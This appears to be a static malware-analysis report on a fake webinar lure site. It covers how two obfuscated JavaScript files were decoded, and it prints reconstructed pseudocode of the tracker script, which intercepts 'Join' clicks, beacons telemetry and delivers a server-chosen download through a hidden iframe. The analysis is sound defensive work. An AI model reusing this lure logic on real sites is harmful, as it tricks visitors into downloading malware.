# JavaScript Deobfuscation

> All analysis here is **static**. No attacker JavaScript was run in a browser, Node.js, a VM, or
> through `eval`. Strings were recovered with Python text processing, and `ast.literal_eval` was
> used only on string literals.

## Samples

| Published path (defanged host) | SHA-256 | Size | Role |
|---|---|---|---|
| `streamyard.host12us[.]com/assets/index-DTuBtXUO.js` | `b59b2faca845ae3a3035cf4f80733b9edaefe3f592c99864edba417b994e1513` | 837,193 B | React app (UI) |
| `streamyard.host12us[.]com/assets/tracker.js?v=8` | `9610644d8653ab2ca10cd45346b43c9825769517bca83cbd2118ae3fb0af0846` | 10,916 B | Click interception and download logic |

urlscan stored both bodies gzip-compressed. After decompression, both matched the SHA-256 values
that urlscan recorded (**Confirmed**).

## Obfuscation scheme (both files)

Both files use the same widely available JavaScript obfuscator pattern:

1. **String array.** Every interesting string is moved into one array returned by a function
   (`a0_0x4fd7()` in the tracker and `a0_0x523a()` in the main bundle).
2. **Array rotation.** An IIFE repeatedly does `push(shift())` until a checksum built from
   `parseInt()` over particular entries equals a constant (`0xde483` for the tracker and `0xee547`
   for the main bundle). Until the array is rotated correctly, indices point at the wrong strings.
3. **Decoder function.** Code reads strings through `a0_0xf230(0xNN)` (tracker) or
   `a0_0x1eb1(0xNNN)` (main), which subtracts an offset (`0xb0` or `0x1c8`) and indexes the array.
4. **Tracker only: encoded entries.** Tracker entries use Base64 with a **lower-case-first
   alphabet** (`a–z A–Z 0–9 + /`), then percent-decoding. The main bundle's entries are plain text.
5. **Decoder aliases.** Functions bind local names to the decoder (`var _0xba61e6 = a0_0xf230`),
   sometimes in chains, so a plain search for the decoder name misses most call sites.
6. **Proxy objects.** Operators and calls are wrapped in object members such as
   `'yrwET': (a, b) => a + b`, so even `"a" + "b"` becomes `obj["yrwET"]("a", "b")`.
7. **Control-flow flattening.** For example, `"5|3|1|4|0|2".split('|')` drives a `switch` inside
   `while(true)`, which hides the order of statements.
8. **Opaque predicates and dead code.** Comparisons of two fixed random strings, such as
   `"wxPJJ" === "fXEub"` (always false), guard decoy branches that refer to undefined variables.

## Static decoding results

### `tracker.js`

| Metric | Value | Status |
|---|---|---|
| String-table entries | 148 (`0xb0`–`0x143`) | Confirmed |
| Rotation that satisfies the checksum | 116 | Confirmed |
| Decoder aliases found (iterative alias resolution) | **14** | Reproduced |
| Decoder calls replaced | **204** | Reproduced |
| Literal `"..." + "..."` concatenations folded | **89** | Reproduced |

The rerun output in [`tools/`](../tools/README.md) was **byte-identical** to the original analysis
artifact.

An earlier pass that used one regular expression for alias detection found only 5 aliases and
folded 35 concatenations. The iterative pass is the one reported above.

### Main bundle (`index-DTuBtXUO.js`)

| Metric | Value | Status |
|---|---|---|
| String-array entries | 3,298 | Confirmed |
| Rotation that satisfies the checksum | 250 | Confirmed |
| Decoder offset | `0x1c8` | Confirmed |

Most of the bundle is minified **React** (react-dom and the scheduler). The application code is one
component, rendered with `createRoot(document.getElementById("root")).render(<te/>)`.

## Reconstructed main-bundle UI

The excerpt below has decoded strings substituted; the JSX structure is condensed:

```text
<main class="page"><section class="invitation">
  <img src="/assets/logo.svg" alt="Logo">
  <h1 id="webinar-title">Webinar</h1>
  <p class="invitation-title">You are invited to webinar</p>
  <p class="description">For enhanced security and access to all services,
     <button class="application-link">use our application</button>.
     We appreciate your patience. The estimated wait time is just a few moments.</p>
  <button class="join-button"> Join → | (busy) spinner + "Connecting…" </button>
</section></main>
```

React's own `onClick` handler on both buttons only sets a "busy" state and clears it after a
`setTimeout` of `0x578` = **1400 ms**. **The main bundle makes no network requests of its own.**
Searches of the decoded bundle found no `fetch`, `XMLHttpRequest`, `WebSocket`, or `/api/` strings.

## Reconstructed `tracker.js` control flow

The pseudocode below is **simplified**. Identifiers are ours, but every string, API call, branch,
and option comes from the statically decoded tracker. Dead opaque-predicate branches are removed
and marked.

```js
(function () {
  const m = location.pathname.match(/^\/meeting\/([A-Za-z0-9]+)\/?$/);
  const code = m ? m[1] : null;
  let busy = false;

  // No meeting code in the URL: send visitor away.
  if (!code) { window.location.replace("/denied.html"); return; }

  // Telemetry beacon, sent twice (Image + fetch keepalive).
  function hit(event, button) {
    const url = "/api/hit?code=" + encodeURIComponent(code || "") +
                "&event="  + encodeURIComponent(event) +
                "&button=" + encodeURIComponent(button || "") +
                "&t=" + Date.now();
    new Image().src = url;
    fetch(url, { method: "GET", keepalive: true, cache: "no-store" }).catch(() => {});
  }

  // Invisible frame used for the "download" action.
  function hiddenFrame(url) {
    const f = document.createElement("iframe");
    f.style.cssText = "position:absolute;width:0;height:0;border:0;visibility:hidden";
    f.src = url;
    document.body.appendChild(f);
  }

  // Flattened switch order "5|3|1|4|0|2", unrolled.
  function isJoinTarget(el) {
    if (!el || !el.closest) return false;                       // 5
    if (el.closest(".join-button")) return true;                // 3
    const btn = el.closest("button, a, [role='button']");       // 1
    if (!btn) return false;                                     // 4
    const text = (btn.textContent || "").toLowerCase();         // 0
    return text.indexOf("join") !== -1 ||                       // 2
           text.indexOf("connecting") !== -1;
  }

  function onJoin(ev) {
    if (busy) { ev && (ev.preventDefault(), ev.stopPropagation()); return; }
    busy = true;
    if (ev) { ev.preventDefault(); ev.stopPropagation(); }      // (dead branch removed)
    hit("click", "join");
    fetch("/api/join?code=" + encodeURIComponent(code), { cache: "no-store" })
      .then(r => { if (!r.ok) throw new Error("Download is unavailable"); return r.json(); })
      .then(data => {                                           // (dead branch removed)
        if (data && data.action === "redirect" && data.url) {
          window.location.assign(data.url); return;
        }
        if (data && data.action === "download" && data.url) {
          hiddenFrame(data.url); return;                        // (dead branch removed)
        }
        throw new Error("Download is unavailable");
      })
      .catch(() => { busy = false; });
  }

  // Capture phase (third argument `!![]` === true).
  document.addEventListener("click", e => {
    if (isJoinTarget(e.target)) onJoin(e);
  }, true);
})();
```

### Observations from the decoded code

| Observation | Status |
|---|---|
| The meeting ID must match `^/meeting/[A-Za-z0-9]+/?$`; otherwise the visitor is sent to `/denied.html`. This is a simple gate that hides the lure from casual or automated visits to the bare host. | Confirmed (code) |
| The listener is registered on `document` in the **capture** phase, so it runs before handlers on the page's own elements. | Confirmed (code) |
| `preventDefault()` and `stopPropagation()` are called on the intercepted click. | Confirmed (code) |
| Only clicks on `.join-button`, or on a button or link whose text contains "join" or "connecting", are intercepted. The "use our application" button has neither, so the tracker ignores it. | Confirmed (code) |
| The join flow runs at most once at a time (`busy`). After a successful `redirect` or `download`, `busy` stays `true`, so later Join clicks are swallowed. | Confirmed (code) |
| The **server** chooses the action and URL. The client contains no payload URL, file name, or platform check. | Confirmed (code) |
| The `/api/join` response for this incident was **not recovered**. | Unknown |
| Because `stopPropagation()` runs in the document capture phase, React's own Join handler probably never ran, so the 1.4 s "Connecting…" spinner probably did not appear. | Inferred (DOM dispatch rules; not tested) |
| Neither sample references `ethereum`, `solana`, wallet providers, `navigator.clipboard`, `document.cookie`, `localStorage`, `sendBeacon`, `WebSocket`, or `userAgent`. The only `clipboard` and `eval` matches in the main bundle are React internals. | Confirmed (static search) |

### Dead code (opaque predicates)

| Predicate | Value | Effect |
|---|---|---|
| `"wxPJJ" === "fXEub"` | always false | Branch that calls undefined `_0x390fa6` is unreachable |
| `"pkgvZ" !== "UWAwb"` | always true | Response is always checked with `.ok` and parsed as JSON |
| `"LRQYY" !== "xpzqX"` | always true | `download` always uses the hidden iframe |

## Reproducing

See [`tools/README.md`](../tools/README.md). You must obtain the two samples yourself, for example
from the public urlscan report by hash. The tools refuse to run if the SHA-256 does not match.
